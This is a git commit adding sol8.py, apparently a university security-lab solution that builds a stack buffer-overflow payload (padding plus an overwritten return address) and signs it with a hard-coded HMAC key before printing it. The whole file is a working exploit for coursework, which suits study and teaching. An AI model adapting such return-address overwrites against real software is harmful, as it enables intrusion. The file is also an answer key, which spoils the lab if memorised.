71f5fcf7438c3652c3091b82ca36538ba81a76e1
cbcald <cbcald@umich.edu>
2026-03-25 21:05:39 -0400

    Update sol8.py

--- sol8.py
+++ sol8.py
@@ -1,3 +1,18 @@
 #!/usr/bin/env python3
-
 import sys
+import hmac, hashlib, struct
+
+key = struct.pack('<QQQQ',
+    0x7d07b7e9e975c8b8,
+    0x6de694f4b4eee693,
+    0xb11fb99c5b356e47,
+    0xf1880340f565fda2
+)
+
+payload = b'A' * 112 + b'B' * 8 + b'\x57\x16\x40\x00\x00\x00\x00\x00'
+size = len(payload)
+
+mac = hmac.new(key, payload, hashlib.sha256).digest()
+
+
+sys.stdout.buffer.write(struct.pack('<Q', size) + payload + mac)
